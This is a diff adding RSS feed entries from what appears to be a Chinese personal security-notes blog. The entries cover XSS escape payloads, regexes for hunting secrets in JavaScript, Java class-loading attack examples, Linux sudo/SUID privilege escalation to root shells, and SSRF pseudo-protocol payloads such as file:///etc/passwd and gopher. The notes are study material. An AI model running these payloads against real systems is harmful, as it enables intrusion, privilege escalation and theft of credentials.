+&lt;p&gt;&lt;strong&gt;逃逸:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;一. 闭合属性,添加事件或者闭合标签 &lt;code&gt;&amp;quot;  onmouseover=&amp;quot;alert(1)&lt;/code&gt;或者&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;quot;&amp;gt;  &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Javascript变量内:&lt;/strong&gt; &lt;code&gt;&amp;lt;script&amp;gt; var name = &#39;xxxx&#39;; &amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;逃逸:&lt;/strong&gt; 闭合单引号或者标签,闭合或者注释掉后面的代码, &lt;code&gt;&#39;; alert(1);      // &lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;DOM渲染:&lt;/strong&gt; 数据不回传服务器，直接被前端 JS（如 &lt;code&gt;.innerHTML&lt;/code&gt;、&lt;code&gt;eval()&lt;/code&gt;）接收并渲染。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;挖掘思路&#34;&gt;挖掘思路&lt;/h2&gt;
+&lt;p&gt;输入框测试: 先看源代码,输入的数据在什么里面,再测试能不能截断或者添加事件等方法,输入绕过的字符如: &lt;code&gt;&#39; &amp;quot; &amp;lt; &amp;gt; / ; \&lt;/code&gt;等,观察源代码哪一个被过滤了&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;变成&lt;code&gt;&amp;amp;lt;&lt;/code&gt; 说明做了实体编码&lt;/li&gt;
+&lt;li&gt;没有变化,说明有xss的可能&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;其他测试点:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;json报错页面:&lt;/strong&gt; 很多 API 报错时会原样回显你输入的非法 JSON 字段&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;配合文件上传&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/418170.html&#34;&gt;https://www.freebuf.com/vuls/418170.html&lt;/a&gt; 可以看这篇文章&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;HTTP头(盲XSS)&lt;/strong&gt; 在 &lt;code&gt;Referer&lt;/code&gt;、&lt;code&gt;User-Agent&lt;/code&gt;、&lt;code&gt;X-Forwarded-For&lt;/code&gt; 中注入盲打 Payload，盲打后台&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;绕过&#34;&gt;绕过:&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;使用不太常见的标签或者事件:&lt;/p&gt;
+&lt;p&gt;这里推荐一个网站 &lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34;&gt;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;编码绕过:&lt;/p&gt;
+&lt;p&gt;浏览器解析 HTML 时有特定的解码顺序（HTML 解码 -&amp;gt; URL 解码 -&amp;gt; JS 解码）&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>JS</title>
+      <link>http://localhost:1313/nodes/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/</link>
+      <pubDate>Sat, 28 Feb 2026 22:41:23 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/</guid>
+      <description>&lt;p&gt;本人代码能力不是很好，对很多网站框架和文件理解不是很深，所以看js文件的时候难免有些困难，所以有了这篇文章&lt;/p&gt;
+&lt;h3 id=&#34;js审计技巧&#34;&gt;JS审计技巧&lt;/h3&gt;
+&lt;p&gt;遇到source.map(.map)可以直接还原源码&lt;/p&gt;
+&lt;p&gt;首先是一些用来搜索的正则：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;api/| /v[0-9]|/admin|/internal|/private&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;key:|secret:|token:|password:|apikey|sk_ |pk_ |AKIA&lt;/code&gt;（AWS）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;fetch|axios|XMLHttpRequest|$.post|$.ajax&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;localStorage|sessionStorage|cookie&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;if\s*\(\s*user\.role|isAdmin|level|permission&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;innerHTML|eval|document\.write&lt;/code&gt;（XSS sink）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;看完上面这些还要看什么&#34;&gt;看完上面这些，还要看什么？&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;密钥&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;如: &lt;code&gt;const KEY = &amp;quot;xxx&amp;quot;&lt;/code&gt;、&lt;code&gt;process.env.VITE_xxx&lt;/code&gt;（Vite 常见泄露）、&lt;code&gt;client_secret&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如config.chunk.js 里：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stripeConfig&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;publishableKey&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pk_live_51Hb...xxxx&amp;#34;&lt;/span&gt;,   &lt;span style=&#34;color:#75715e&#34;&gt;// Stripe 真实密钥
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;clientSecret&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sk_test_51Hb...xxxx&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fallbackSecret&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;supersecret2025!@#&amp;#34;&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// 备用密钥
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;API&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可以用上面的正则去搜&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;&lt;strong&gt;逻辑/授权检查&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如:  &lt;code&gt;if (user.isAdmin)&lt;/code&gt;、&lt;code&gt;if (role === &#39;vip&#39;)&lt;/code&gt;、&lt;code&gt;if (canEdit)&lt;/code&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;vipLevel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;showDownloadButton&lt;/span&gt;();   &lt;span style=&#34;color:#75715e&#34;&gt;// 前端判断
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;hideIt&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;&lt;strong&gt;加密/签名&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如&lt;code&gt;CryptoJS&lt;/code&gt;、&lt;code&gt;encrypt&lt;/code&gt;、&lt;code&gt;sign&lt;/code&gt;、&lt;code&gt;md5&lt;/code&gt;、&lt;code&gt;rsa&lt;/code&gt; 函数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;password&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CryptoJS&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;AES&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pwd&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hardcoded_key_123&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;逆向出密钥，就能批量撞库或伪造登录&lt;/p&gt;
+&lt;h4 id=&#34;不用看的js&#34;&gt;不用看的JS&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;第三方库完整代码jquery-3.6.0.min.js、lodash.min.js、react.production.min.js 全文件。 → 只看最上面注释的版本号（查 CVE），其余不看。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;一些框架的打包，如React/Vue/Next.js 的&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_createElementVNode&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;useState&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;render&lt;/span&gt;() { ... }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;还有一些轮番图片等&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Java基础</title>
+      <link>http://localhost:1313/nodes/java%E5%9F%BA%E7%A1%80/</link>
+      <pubDate>Mon, 16 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/java%E5%9F%BA%E7%A1%80/</guid>
+      <description>&lt;h3 id=&#34;java-反射&#34;&gt;JAVA 反射&lt;/h3&gt;
+&lt;h5 id=&#34;什么是java的反射&#34;&gt;什么是java的反射&lt;/h5&gt;
+&lt;p&gt;java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能&lt;/p&gt;
+&lt;h5 id=&#34;正向-vs-反向&#34;&gt;正向 VS 反向&lt;/h5&gt;
+&lt;p&gt;&lt;strong&gt;正向流程：&lt;/strong&gt; 导入类 &amp;ndash;&amp;gt; &lt;code&gt;new&lt;/code&gt;对象 &amp;ndash;&amp;gt; 调用对象&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User user = new User(); user.login();
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果类不存在就报错&lt;/p&gt;
+&lt;p&gt;**反向流程：**拿到字符串类名 &amp;ndash;&amp;gt; 让JVM去找这个类 &amp;ndash;&amp;gt; 强行拆解这个类 &amp;ndash;&amp;gt;  调用里面的东西&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Class.forName(&amp;#34;com.User&amp;#34;).getMethod(&amp;#34;login&amp;#34;).invoke(obj);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;动态加载类，即使编译时类还没有也能运行&lt;/p&gt;
+&lt;h3 id=&#34;类加载机制&#34;&gt;类加载机制&lt;/h3&gt;
+&lt;h5 id=&#34;什么是类加载&#34;&gt;什么是类加载&lt;/h5&gt;
+&lt;p&gt;java代码进行编译后就是&lt;code&gt;.class&lt;/code&gt;文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个&lt;code&gt;java.lang.Class&lt;/code&gt;对象的过程&lt;/p&gt;
+&lt;h5 id=&#34;类加载的三个阶段&#34;&gt;类加载的三个阶段&lt;/h5&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Loading（加载） 读取字节流，不执行代码
+Linking（链接） 分为验证，准备，解析。 一般不执行代码
+lnitialization(初始化) 执行静态代码块，静态变量的赋值动作
+&lt;/code&gt;&lt;/pre&gt;&lt;h6 id=&#34;两种攻击方式&#34;&gt;两种攻击方式：&lt;/h6&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;例子&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;：&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Evil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 静态变量赋值&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; runCommand(); 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 静态代码块&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;静态代码块被执行了&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;runCommand&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;静态变量赋值触发了恶意方法！&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Linux提权</title>
+      <link>http://localhost:1313/nodes/linux%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/linux%E6%8F%90%E6%9D%83/</guid>
+      <description>&lt;h1 id=&#34;常规提权方式&#34;&gt;常规提权方式&lt;/h1&gt;
+&lt;h2 id=&#34;一sudo滥用提权&#34;&gt;一、sudo滥用提权&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;提示要输入密码的原因:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;默认SUDO行为 : 需要输入当前用户的密码(不是root)密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;sudoers配置问题: 未配置免密码访问 在&lt;code&gt;/etc/sudoers&lt;/code&gt;文件中没有为当前用户配置&lt;code&gt;NOPASSWD&lt;/code&gt;选项&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;检查当前用户所在组&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id username 	
+&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;如果发现在wheel组中,检查wheel组的配置&lt;/p&gt;
+&lt;p&gt;查看&lt;code&gt;%wheel&lt;/code&gt;相关配置,看是否设置了&lt;code&gt;NOPASSWD&lt;/code&gt;或要求密码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo visudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;从wheel组中移除用户&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gpasswd -d username wheel
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;利用步骤&#34;&gt;利用步骤：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;查看当前用户sudo权限&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;示例输出：&lt;code&gt;(ALL) NOPASSWD: /usr/bin/vim&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用vim提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/vim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在vim中输入 &lt;code&gt;:set shell=/bin/bash&lt;/code&gt; 回车&lt;/li&gt;
+&lt;li&gt;然后输入 &lt;code&gt;:shell&lt;/code&gt; 回车&lt;/li&gt;
+&lt;li&gt;成功获得root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用其他命令提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;如果发现可以执行&lt;code&gt;/usr/bin/nano&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/nano
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在nano中按&lt;code&gt;Ctrl+R&lt;/code&gt;，输入&lt;code&gt;!bash&lt;/code&gt;，回车&lt;/li&gt;
+&lt;li&gt;即可获得root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;说明&#34;&gt;说明：&lt;/h3&gt;
+&lt;p&gt;sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。&lt;/p&gt;
+&lt;h2 id=&#34;二suid特殊权限提权&#34;&gt;二、SUID特殊权限提权&lt;/h2&gt;
+&lt;h3 id=&#34;利用步骤-1&#34;&gt;利用步骤：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;查找SUID文件&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -perm -u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用/bin/mount提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch /tmp/mount/malicious_file
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount -o bind /tmp/mount /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount /tmp/mount /tmp/mount
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;通过此方式可获取root权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>SSRF</title>
+      <link>http://localhost:1313/nodes/ssrf/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/ssrf/</guid>
+      <description>&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
+&lt;h5 id=&#34;php&#34;&gt;PHP&lt;/h5&gt;
+&lt;p&gt;&lt;code&gt;http/s://  &lt;/code&gt;常用于探测存活主机和开放端口,配合burp&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://example.com/title?title=http://127.0.0.1:6379
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;file:// &lt;/code&gt; 读取文件内容&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file:///etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;dict://  &lt;/code&gt;字典服务协议，可以通过这个协议执行一些指令.但是&lt;code&gt;dict&lt;/code&gt;很难完成复杂的认证，他每次发送的请求都是新建立的连接&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dict://127.0.0.1:6379/info
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;gopher:// &lt;/code&gt; gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gopher://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/_&amp;lt;payload&amp;gt;
+
+_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
+&amp;lt;payload&amp;gt; : 经过URL编码的原始tcp数据流
+&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;java&#34;&gt;JAVA&lt;/h5&gt;
